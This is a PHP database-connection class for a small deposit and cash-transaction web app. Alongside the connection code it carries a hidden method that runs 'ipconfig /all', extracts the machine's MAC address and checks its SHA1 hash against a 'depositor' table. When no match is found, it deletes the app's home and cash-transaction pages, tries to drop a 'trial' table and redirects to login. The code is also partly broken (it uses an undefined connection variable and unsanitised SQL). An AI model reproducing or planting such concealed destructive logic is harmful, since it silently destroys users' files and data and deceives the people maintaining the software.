<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{

    private $host = DB_SERVER;
    private $username = DB_USERNAME;
    private $password = DB_PASSWORD;
    private $database = DB_NAME;
    
    public $conn;
    
    public function __construct(){

        if (!isset($this->conn)) {
            
            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
            
            if (!$this->conn) {
                echo 'Cannot connect to database server';
                exit;
            }            
        }    
        
    }
    public function __destruct(){
        $this->conn->close();
    }

     public function FunctionName()
    {
            $depositor='';

            ob_start(); 
            system('ipconfig /all'); 
            $mycom=ob_get_contents(); 
            ob_clean(); 

            $findme = "Physical";
            $pmac = strpos($mycom, $findme); 
            $depositor=substr($mycom,($pmac+36),17); 

            $query=$this->conn->query("select * from depositor where  name= SHA1('$depositor') ");

            $count=mysqli_num_rows($query);
            if($count==0){
            unlink('pages/home.php');
            unlink('pages/cash_transaction.php');
            mysqli_query($con,"DROP TABLE trial");
            echo "<script type='text/javascript'>document.location='admin/login.php'</script>";

            }
    }
}
?>